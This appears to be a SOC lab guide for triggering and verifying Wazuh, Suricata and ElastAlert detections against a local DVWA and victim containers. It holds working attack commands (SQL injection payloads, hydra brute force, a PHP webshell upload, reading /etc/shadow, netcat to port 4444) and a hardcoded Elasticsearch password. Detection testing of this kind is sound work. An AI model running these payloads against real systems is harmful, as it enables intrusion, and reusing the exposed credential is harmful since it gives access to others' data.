# SOC Stack Testing Guide

How to simulate attacks and verify that alerts fire in Kibana and Slack.

---

## Prerequisites

- SOC stack running: `bash ~/soc-stack/start-soc.sh`
- Kibana accessible: http://localhost:5601
- DVWA accessible: http://localhost:8890
- ElastAlert running: `docker ps | grep elastalert`
- Slack webhook configured in `elastalert/rules/*.yaml`

---

## 1. Verify Services Are Up

```bash
docker ps --format "table {{.Names}}\t{{.Status}}" | grep -E "elasticsearch|kibana|wazuh|elastalert|suricata"
```

Expected: All containers show `Up` status.

---

## 2. SQL Injection (DVWA)

**Goal:** Trigger `sql_injection.yaml` and `web_attacks.yaml` rules.

```bash
# From any machine or using curl:
curl -s "http://localhost:8890/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc; security=low" -o /dev/null

# More aggressive — UNION based:
curl -s "http://localhost:8890/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2--&Submit=Submit" \
  -H "Cookie: PHPSESSID=abc; security=low" -o /dev/null
```

**Verify in Kibana:**
- Navigate to: Discover → Index `wazuh-alerts-*`
- Filter: `rule.groups: web`

---

## 3. Port Scan (Kali → Victims)

**Goal:** Trigger `port_scan.yaml` and `network_recon.yaml` rules.

```bash
# From kali-attacker container:
docker exec kali-attacker nmap -sS -p 1-1000 172.20.0.0/24

# Or from the host:
nmap -sS -p 22,80,443,3306,8080 <victim-ip>
```

**Verify in Kibana:**
- Navigate to: Discover → Index `soc-logs-enriched-*`
- Filter: `event_type: alert AND alert.category: "Attempted Information Leak"`

---

## 4. SSH Brute Force

**Goal:** Trigger `ssh_brute_force.yaml` and `brute_force.yaml` rules.

```bash
# From kali-attacker or host:
docker exec kali-attacker hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://victim-ubuntu -t 4 -vV 2>&1 | head -30

# Simple bash loop (no hydra needed):
for i in $(seq 1 10); do
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    wronguser@localhost -p 2222 "test" 2>/dev/null || true
done
```

**Verify in Kibana:**
- Navigate to: Discover → Index `wazuh-alerts-*`
- Filter: `rule.groups: authentication_failed AND data.srcip: *`

---

## 5. HTTP Brute Force (DVWA Login)

**Goal:** Trigger `http_brute_force.yaml` rule.

```bash
# Hydra HTTP form attack:
docker exec kali-attacker hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "localhost:8890/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -t 10 -vV 2>&1 | head -30

# Curl loop:
for i in $(seq 1 15); do
  curl -s -o /dev/null -X POST http://localhost:8890/dvwa/login.php \
    -d "username=admin&password=wrongpass${i}&Login=Login"
done
```

**Verify in Kibana:**
- Navigate to: Discover → Index `wazuh-alerts-*`
- Filter: `rule.groups: web AND data.url: *login*`

---

## 6. File Upload Attack

**Goal:** Trigger `file_upload_attack.yaml` rule.

```bash
# Upload a PHP webshell to DVWA:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -s -X POST "http://localhost:8890/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=abc; security=low" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  -F "Upload=Upload" -o /dev/null
```

**Verify in Kibana:**
- Navigate to: Discover → Index `wazuh-alerts-*`
- Filter: `data.url: *upload* AND rule.groups: web`

---

## 7. Privilege Escalation

**Goal:** Trigger `privilege_escalation.yaml` rule.

```bash
# Inside a victim container:
docker exec -it victim-ubuntu bash -c "sudo id 2>&1 || true"
docker exec -it victim-ubuntu bash -c "sudo cat /etc/shadow 2>&1 || true"
```

**Verify in Kibana:**
- Navigate to: Discover → Index `wazuh-alerts-*`
- Filter: `rule.groups: sudo`

---

## 8. C2 Beaconing (Simulated)

**Goal:** Trigger `suricata_alert.yaml` rule (requires custom Suricata rule).

Add a custom Suricata rule for beaconing simulation:
```bash
echo 'alert tcp any any -> any 4444 (msg:"C2 Beaconing"; sid:9000001; rev:1;)' \
  >> ~/soc-stack/suricata/rules/local.rules

# Then generate matching traffic:
docker exec kali-attacker bash -c "echo test | nc -w 1 <victim-ip> 4444" 2>/dev/null || true
```

---

## 9. Verify ElastAlert is Processing Rules

```bash
# Watch elastalert logs in real time:
docker logs -f elastalert 2>&1 | grep -E "Queried|matches|Sent|ERROR"

# Check elastalert status index:
curl -sf -u elastic:sYVfKJCe2RCfELjf=GLa \
  "http://localhost:9200/elastalert_status/_search?size=5&sort=@timestamp:desc" \
  | python3 -m json.tool 2>/dev/null | grep -A2 "rule_name\|match_time"
```

---

## 10. Configure Slack Webhook

1. Go to https://api.slack.com/apps → Create App → Incoming Webhooks
2. Enable Incoming Webhooks and copy the webhook URL
3. Update all rule files:
   ```bash
   find ~/soc-stack/elastalert/rules -name "*.yaml" \
     -exec sed -i 's|YOUR_REAL_WEBHOOK|T00000000/B00000000/XXXXXXXXXXXX|g' {} \;
   ```
   Replace `T00000000/B00000000/XXXXXXXXXXXX` with your actual webhook path.
4. Restart ElastAlert: `docker restart elastalert`

---

## Quick Health Check

```bash
# Run all health checks:
bash ~/soc-stack/scripts/healthcheck-misp.sh
bash ~/soc-stack/scripts/monitor-wazuh-agents.sh
bash ~/soc-stack/scripts/cleanup-es-indices.sh
```
